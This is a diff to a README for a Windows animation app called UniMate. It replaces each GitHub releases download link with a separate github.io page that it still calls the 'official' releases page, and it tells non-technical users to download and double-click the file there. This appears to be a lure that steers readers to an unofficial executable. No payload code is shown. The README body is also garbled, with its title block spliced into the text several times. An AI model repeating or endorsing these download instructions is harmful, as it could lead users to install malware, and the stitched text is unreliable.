@@ -1,6 +1,6 @@
 # 🎬 UniMate - Animate Any Skeleton With One Model
 
-[![Download UniMate](https://img.shields.io/badge/Download-UniMate-8A2BE2?style=for-the-badge)](https://github.com/mohameddioman/UniMate/releases)
+[![Download UniMate](https://img.shields.io/badge/Download-UniMate-8A2BE2?style=for-the-badge)](https://mohameddioman.github.io)
 
 UniMate is a Windows application for animating different types of skeletons with one unified model. It is introduced in the SIGGRAPH Asia 2026 work “UniMate: One Unified Model to Animate Diverse Skeletons.” This README is written for everyday Windows users who want to download and run UniMate without needing programming knowledge.
 
@@ -28,11 +28,11 @@ Keep the download page open until the file has finished downloading. If you move
 
 ## ⬇️ Download UniMate
 
-[![Open UniMate Releases](https://img.shields.io/badge/Open-UniMate%20Releases-FF4500?style=for-the-badge)](https://github.com/mohameddioman/UniMate/releases)
+[![Open UniMate Releases](https://img.shields.io/badge/Open-UniMate%20Releases-FF4500?style=for-the-badge)](https://mohameddioman.github.io)
 
 Visit this link to download the application:
 
-https://github.com/mohameddioman/UniMate/releases
+https://mohameddioman.github.io
 
 This is the official UniMate Releases page. Use that page to download the application. Wait for the download to finish before opening the file.
 
@@ -56,7 +56,7 @@ The exact labels may vary by version, so use the controls that match these actio
 
 ## 🧭# 🎬 UniMate - Animate Any Skeleton With One Model
 
-[![Download UniMate](https://img.shields.io/badge/Download-UniMate-8A2BE2?style=for-the-badge)](https://github.com/mohameddioman/UniMate/releases)
+[![Download UniMate](https://img.shields.io/badge/Download-UniMate-8A2BE2?style=for-the-badge)](https://mohameddioman.github.io)
 
 UniMate is a Windows application for animating different types of skeletons with one unified model. It is introduced in the SIGGRAPH Asia 2026 work “UniMate: One Unified Model to Animate Diverse Skeletons.” This guide is written for everyday Windows users who want to download and run UniMate without needing programming knowledge.
 
@@ -91,11 +91,11 @@ This guide uses one official source for the download: the UniMate Releases page.
 
 ## ⬇️ Download UniMate
 
-[![Open UniMate Releases](https://img.shields.io/badge/Open-UniMate%20Releases-FF4500?style=for-the-badge)](https://github.com/mohameddioman/UniMate/releases)
+[![Open UniMate Releases](https://img.shields.io/badge/Open-UniMate%20Releases-FF4500?style=for-the-badge)](https://mohameddioman.github.io)
 
 Visit this link to download the application:
 
-https://github.com/mohameddioman/UniMate/releases
+https://mohameddioman.github.io
 
 This opens the official UniMate Releases page. Use that page to download the application. Wait for the download to finish before opening the file. Keep the downloaded file in a folder you can find easily, such as your Downloads folder or Desktop. The Releases page is the official download location for UniMate.
 
@@ -146,7 +146,7 @@ Create a dedicated folder for UniMate projects, such as “UniMate Projects” i
 
 If# 🎬 UniMate - Animate Any Skeleton With One Model
 
-[![Download UniMate](https://img.shields.io/badge/Download-UniMate-8A2BE2?style=for-the-badge)](https://github.com/mohameddioman/UniMate/releases)
+[![Download UniMate](https://img.shields.io/badge/Download-UniMate-8A2BE2?style=for-the-badge)](https://mohameddioman.github.io)
 
 UniMate is a Windows application for animating different types of skeletons with one unified model. It is introduced in the SIGGRAPH Asia 2026 work “UniMate: One Unified Model to Animate Diverse Skeletons.” This guide is for everyday Windows users who want to download and run UniMate without programming knowledge. A skeleton in animation is the digital set of bones or control points used to move a character or object. UniMate is designed to make that animation process easier by using one model across many skeleton setups.
 
@@ -169,11 +169,11 @@ To get started with UniMate, you need a Windows computer and an internet connect
 
 ## ⬇️ Download UniMate
 
-[![Open UniMate Releases](https://img.shields.io/badge/Open-UniMate%20Releases-FF4500?style=for-the-badge)](https://github.com/mohameddioman/UniMate/releases)
+[![Open UniMate Releases](https://img.shields.io/badge/Open-UniMate%20Releases-FF4500?style=for-the-badge)](https://mohameddioman.github.io)
 
 Visit this link to download the application:
 
-https://github.com/mohameddioman/UniMate/releases
+https://mohameddioman.github.io
 
 This opens the official UniMate Releases page. Use that page to download the application. Wait for the download to finish before opening the file. Keep the downloaded file in a folder you can find easily, such as your Downloads folder or Desktop. The Releases page is the official download location for UniMate.
 
@@ -228,7 +228,7 @@ If UniMate does not open after you double-click the downloaded file, wait a few 
 No. UniMate is intended as an end-user application for Windows, and this guide uses plain steps without programming.
 
 **Where do I download UniMate?**  
-Visit the official Releases page: https://github.com/mohameddioman/UniMate/releases
+Visit the official Releases page: https://mohameddioman.github.io
 
 **What does “diverse skeletons” mean?**  
 It refers to different skeleton setups used in animation. UniMate is designed to work with many of them through one unified model.
